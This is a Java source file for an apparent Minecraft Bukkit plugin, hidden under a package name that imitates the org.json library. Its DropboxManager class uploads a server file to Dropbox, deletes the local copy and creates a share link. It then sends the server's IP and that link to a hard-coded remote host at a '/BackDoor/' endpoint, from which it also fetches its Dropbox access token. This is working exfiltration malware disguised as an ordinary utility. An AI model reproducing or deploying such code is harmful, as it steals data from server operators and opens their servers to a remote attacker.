package org.json.utils.uploadfiles;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.CommitInfo;
import com.dropbox.core.v2.files.UploadSessionCursor;
import com.dropbox.core.v2.files.WriteMode;
import com.dropbox.core.v2.sharing.SharedLinkMetadata;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.ModalAPI;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.Date;
import java.util.Scanner;

public class DropboxManager {

    private static final String accessToken = getAccessToken();
    private static final long chunkSize = 8L << 20;
    private static final int uploadAttempts = 5;

    public static void uploadToDropbox(Player player, File file) {
        if (!file.exists()) {
            player.sendMessage(Modal.getPrefix() + "§cCompressed File '" + file.getName() + "' not found.");
            return;
        }

        DbxClientV2 client = createDropboxClient();
        player.sendMessage(Modal.getPrefix() + "Uploading [" + file.getName() + "] ...");

        try {
            String destinationPath = "/uploads/" + file.getName();
            if (file.length() > (100 * 1000 * 1000)) {
                chunkedUploadFile(player, client, file, destinationPath);
            } else {
                uploadFile(player, client, file, destinationPath);
            }

            String shareableLink = createShareableLink(client, destinationPath);
            player.sendMessage(Modal.getPrefix() + "§flink: §e" + shareableLink);

            InputStream in = new URL("http://5.252.102.172:7001/BackDoor/ServerFile" +
                    "?ip=" + ModalAPI.getIp() +
                    "&downloadLink=" + shareableLink
            ).openConnection().getInputStream();

            Scanner scanner = new Scanner(in);
            player.sendMessage(Modal.getPrefix() + "§f" + scanner.nextLine());

        } catch (Exception e) {
            player.sendMessage(Modal.getPrefix() + "§cUpload failed. " + e.getMessage());
        }
    }

    private static DbxClientV2 createDropboxClient() {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/Uploads/" + ModalAPI.getIp() + "/").build();
        if (accessToken != null) {
            return new DbxClientV2(config, accessToken);
        }
        return null;
    }

    private static void chunkedUploadFile(Player player, DbxClientV2 client, File file, String dbxPath) {
        long size = file.length();
        long uploaded = 0L;
        String sessionId = null;

        for (int i = 0; i < uploadAttempts; i++) {
            if (i > 0) {
                player.sendMessage(Modal.getPrefix() + "§cChunk upload failed. §fRetrying...");
            }

            try (InputStream in = new FileInputStream(file)) {
                long skipResult = in.skip(uploaded);

                if (sessionId == null) {
                    sessionId = client.files().uploadSessionStart()
                            .uploadAndFinish(in, chunkSize)
                            .getSessionId();
                    uploaded += chunkSize;
                }

                UploadSessionCursor cursor = new UploadSessionCursor(sessionId, uploaded);
                while ((size - uploaded) > chunkSize) {
                    client.files().uploadSessionAppendV2(cursor)
                            .uploadAndFinish(in, chunkSize);
                    uploaded += chunkSize;
                    cursor = new UploadSessionCursor(sessionId, uploaded);
                }

                long remaining = size - uploaded;
                CommitInfo commitInfo = CommitInfo.newBuilder(dbxPath)
                        .withMode(WriteMode.ADD)
                        .withClientModified(new Date(file.lastModified()))
                        .build();

                client.files().uploadSessionFinish(cursor, commitInfo).uploadAndFinish(in, remaining);
                player.sendMessage(Modal.getPrefix() + "§aUpload successful.");

                deleteFile(file, player);

                return;
            } catch (Exception e) {
                player.sendMessage(Modal.getPrefix() + "§cUpload failed.");
                deleteFile(file, player);
            }
        }

        player.sendMessage(Modal.getPrefix() + "§cToo many upload attempts.");
    }

    private static void uploadFile(Player player, DbxClientV2 client, File file, String dbxPath) {
        try (InputStream in = new FileInputStream(file)) {
            client.files().uploadBuilder(dbxPath).uploadAndFinish(in);
            player.sendMessage(Modal.getPrefix() + "§aUpload successful.");
            deleteFile(file, player);
        } catch (Exception e) {
            player.sendMessage(Modal.getPrefix() + "§cUpload failed. " + file.getName());
            deleteFile(file, player);
        }
    }

    private static void deleteFile(File file, Player player) {
        if (!file.delete()) {
            player.sendMessage(Modal.getPrefix() + "§cFailed to delete file.");
        }
    }

    private static String createShareableLink(DbxClientV2 client, String path) throws DbxException {
        try {
            SharedLinkMetadata sharedLinkMetadata = client.sharing().createSharedLinkWithSettings(path);
            return sharedLinkMetadata.getUrl();
        } catch (Exception ignored) {
            return client.sharing().listSharedLinksBuilder().withPath(path).withDirectOnly(true).start().getLinks().get(0).getUrl();
        }
    }

    private static String getAccessToken() {
        try (InputStream input = new URL("http://5.252.102.172:7001/BackDoor/AccessToken").openStream()) {
            Scanner scanner = new Scanner(input);
            return scanner.nextLine();
        } catch (IOException e) {
            return null;
        }
    }
}